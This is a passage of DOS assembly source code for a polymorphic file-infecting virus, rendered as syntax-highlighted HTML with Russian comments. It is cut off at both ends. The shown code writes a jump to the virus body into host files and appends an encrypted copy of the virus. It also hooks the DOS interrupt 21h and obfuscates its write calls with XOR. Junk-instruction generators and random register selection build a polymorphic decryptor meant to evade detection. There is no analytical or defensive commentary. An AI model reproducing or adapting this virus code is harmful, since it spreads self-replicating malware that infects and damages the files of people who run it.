    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Set_FP2</span><span class="sc0">         </span><span class="sc1">;тут будет переход на тело вируса</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc0">          </span><span class="sc1">;Размер</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">          </span><span class="sc1">;вычисляем смещение для Call вирус</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0E8h</span><span class="sc0">    </span><span class="sc1">;Call My_Point</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">Dec</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">StoSW</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc5">VP1</span><span class="sc0">      </span><span class="sc1">;Write File</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">              </span><span class="sc1">;Записали команду перехода</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Set_FP</span><span class="sc0">

    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Si</span><span class="sc0">           </span><span class="sc1">;Буфер</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">609Ch</span><span class="sc0">
    </span><span class="sc6">StoSW</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dl</span><span class="sc4">,</span><span class="sc2">00110000b</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Reg_Musor</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">1Eh</span><span class="sc0">          </span><span class="sc1">;Push Ds</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Com_Musor</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">0Eh</span><span class="sc0">          </span><span class="sc1">;Push Cs</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Com_Musor</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">          </span><span class="sc1">;Pop Ds</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Com_Musor</span><span class="sc0">

    </span><span class="sc6">In</span><span class="sc0">  </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc8">Al</span><span class="sc0">
    </span><span class="sc6">Shr</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dl</span><span class="sc4">,</span><span class="sc2">00110111b</span><span class="sc0">            </span><span class="sc1">;Bx,Si,Di</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">GetFrRS</span><span class="sc0">         </span><span class="sc1">;регистр базы</span><span class="sc0">
    </span><span class="sc6">And</span><span class="sc0"> </span><span class="sc8">Dl</span><span class="sc4">,</span><span class="sc2">11111000b</span><span class="sc0">        </span><span class="sc1">;Sp - не используем</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">LoadReg</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Reg_Musor</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">@LeaTabBI</span><span class="sc0">

</span><span class="sc5">TabBI</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">9Fh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0B4h</span><span class="sc4">,</span><span class="sc2">0BDh</span><span class="sc0">

</span><span class="sc5">@LeaTabBI</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Xlat</span><span class="sc0">
    </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Rand04</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc8">Cl</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">Jb</span><span class="sc0">  </span><span class="sc5">@R_Xor</span><span class="sc0">
    </span><span class="sc6">Je</span><span class="sc0">  </span><span class="sc5">@R_Add</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">29h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">@R_Sub</span><span class="sc0">
</span><span class="sc5">@R_Add</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cl</span><span class="sc4">,</span><span class="sc2">29h</span><span class="sc0">
    </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">@R_Sub</span><span class="sc0">
</span><span class="sc5">@R_Xor</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">31h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cl</span><span class="sc4">,</span><span class="sc2">31h</span><span class="sc0">
</span><span class="sc5">@R_Sub</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Rnd_Com</span><span class="sc4">],</span><span class="sc8">Cl</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">StoSW</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc0">          </span><span class="sc1">;регистр</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">StoSW</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Reg_Musor</span><span class="sc0">
    </span><span class="sc6">Or</span><span class="sc0">  </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">01000000b</span><span class="sc0">        </span><span class="sc1">;Inc</span><span class="sc0">
    </span><span class="sc6">StoSB</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Reg_Musor</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc0">          </span><span class="sc1">;Cmp</span><span class="sc0">
    </span><span class="sc6">StoSW</span><span class="sc0">
    </span><span class="sc6">Or</span><span class="sc0">  </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">11111000b</span><span class="sc0">
    </span><span class="sc6">StoSB</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Di</span><span class="sc0">          </span><span class="sc1">;значение</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc0">          </span><span class="sc1">;Jne</span><span class="sc0">
    </span><span class="sc6">StoSW</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Reg_Musor</span><span class="sc0">
    </span><span class="sc6">StoSW</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">Cl</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Si</span><span class="sc0">           </span><span class="sc1">;размер 1 части</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Bp</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Bp</span><span class="sc4">,</span><span class="sc8">Sp</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;размер проги</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;рандомное значение</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Bx</span><span class="sc4">],</span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc5">Shifr_Lenght</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Bx</span><span class="sc4">],</span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Bp</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Sp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc5">VP1</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">
    
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc5">Vir_Lenght</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Repe</span><span class="sc0">    </span><span class="sc6">MovSB</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,(</span><span class="sc5">Shifr_Lenght</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">Shr</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">@LoopSh</span><span class="sc4">:</span><span class="sc6">LodSW</span><span class="sc0">
</span><span class="sc5">Rnd_Com</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">My_Point</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Inc</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Inc</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">StoSW</span><span class="sc0">
    </span><span class="sc6">Loop</span><span class="sc0">    </span><span class="sc5">@LoopSh</span><span class="sc0">

    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc5">Vir_Lenght</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc5">VP1</span><span class="sc0">      </span><span class="sc1">;Write_File</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">              </span><span class="sc1">;Дописали вирус</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc5">Infect</span><span class="sc0">  </span><span class="sc9">EndP</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">Set_Int21h</span><span class="sc0">  </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Ds</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc0">
    </span><span class="sc6">Cli</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc5">DOSInt</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;Int 03h</span><span class="sc0">
    </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc5">DOSInt</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc5">DOSInt</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Int 03h</span><span class="sc0">
    </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc5">DOSInt</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Sti</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc5">Set_Int21h</span><span class="sc0">  </span><span class="sc9">EndP</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">My_Int21h</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">My_Point</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc5">VP</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0EAh</span><span class="sc0">
</span><span class="sc5">Ofs21h</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">My_Point</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Seg21h</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">My_Point</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc5">GetFrR</span><span class="sc0">  </span><span class="sc9">Proc</span><span class="sc0">

</span><span class="sc1">;(Вых) Al - свободный регистр</span><span class="sc0">

</span><span class="sc5">@NextR</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Rand08</span><span class="sc0">
    </span><span class="sc6">Bt</span><span class="sc0">  </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Jc</span><span class="sc0">  </span><span class="sc5">@NextR</span><span class="sc0">          </span><span class="sc1">;Регистр уже используется</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc5">GetFrR</span><span class="sc0">  </span><span class="sc9">Endp</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">GetFrRS</span><span class="sc0"> </span><span class="sc9">Proc</span><span class="sc0">

</span><span class="sc1">;(Вых) Al - свободный регистр (объявляется занятым)</span><span class="sc0">

</span><span class="sc5">@NextRS</span><span class="sc4">:</span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Rand08</span><span class="sc0">
    </span><span class="sc6">Bts</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Jc</span><span class="sc0">  </span><span class="sc5">@NextRS</span><span class="sc0">         </span><span class="sc1">;Регистр уже используется</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc5">GetFrRS</span><span class="sc0"> </span><span class="sc9">Endp</span><span class="sc0">
</span><span class="sc2">.286</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">Rand04</span><span class="sc0">  </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">In</span><span class="sc0">  </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">And</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">11b</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc5">Rand04</span><span class="sc0">  </span><span class="sc9">EndP</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">Rand08</span><span class="sc0">  </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">In</span><span class="sc0">  </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">And</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">111b</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc5">Rand08</span><span class="sc0">  </span><span class="sc9">EndP</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">LoadReg</span><span class="sc0"> </span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc1">;генерирует команду(ы) загрузки регистра</span><span class="sc0">
</span><span class="sc1">;Ax - используемый регистр</span><span class="sc0">
</span><span class="sc1">;Cx - значение</span><span class="sc0">
</span><span class="sc1">;Es:Di - буфер</span><span class="sc0">

</span><span class="sc1">;на выходе: Es:Di - буфер для новой команды</span><span class="sc0">

    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">In</span><span class="sc0">  </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">Test</span><span class="sc0">    </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">100b</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Je</span><span class="sc0">  </span><span class="sc5">LM1</span><span class="sc0">

</span><span class="sc1">;---------------------------</span><span class="sc0">
</span><span class="sc5">LM0</span><span class="sc0"> </span><span class="sc9">Proc</span><span class="sc0">

</span><span class="sc1">;команда Mov Rg16,Im</span><span class="sc0">

    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Or</span><span class="sc0">  </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">10111000b</span><span class="sc0">        </span><span class="sc1">;Mov Rg16,Im</span><span class="sc0">
    </span><span class="sc6">StoSB</span><span class="sc0">
    </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">StoSW</span><span class="sc0">
    </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc5">LM0</span><span class="sc0"> </span><span class="sc9">Endp</span><span class="sc0">
</span><span class="sc1">;---------------------------</span><span class="sc0">
</span><span class="sc5">LM1</span><span class="sc0"> </span><span class="sc9">Proc</span><span class="sc0">

</span><span class="sc1">;команды Push Im16</span><span class="sc0">
</span><span class="sc1">;        несколько мусора</span><span class="sc0">
</span><span class="sc1">;        Pop R16</span><span class="sc0">

    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Or</span><span class="sc0">  </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">01011000b</span><span class="sc0">        </span><span class="sc1">;Pop R16</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc0">          </span><span class="sc1">;Push Im16</span><span class="sc0">
    </span><span class="sc6">StoSB</span><span class="sc0">
    </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">StoSW</span><span class="sc0">
    </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">StoSB</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc5">LM1</span><span class="sc0"> </span><span class="sc9">Endp</span><span class="sc0">
</span><span class="sc1">;---------------------------</span><span class="sc0">

</span><span class="sc5">LoadReg</span><span class="sc0"> </span><span class="sc9">Endp</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">Com_Musor</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">StoSB</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">Reg_Musor</span><span class="sc0">   </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Rand04</span><span class="sc0">
    </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">JCxz</span><span class="sc0">    </span><span class="sc5">@ExitRM</span><span class="sc0">
</span><span class="sc5">@LoopRM</span><span class="sc4">:</span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc6">In</span><span class="sc0">  </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc8">Al</span><span class="sc0">
    </span><span class="sc6">In</span><span class="sc0">  </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
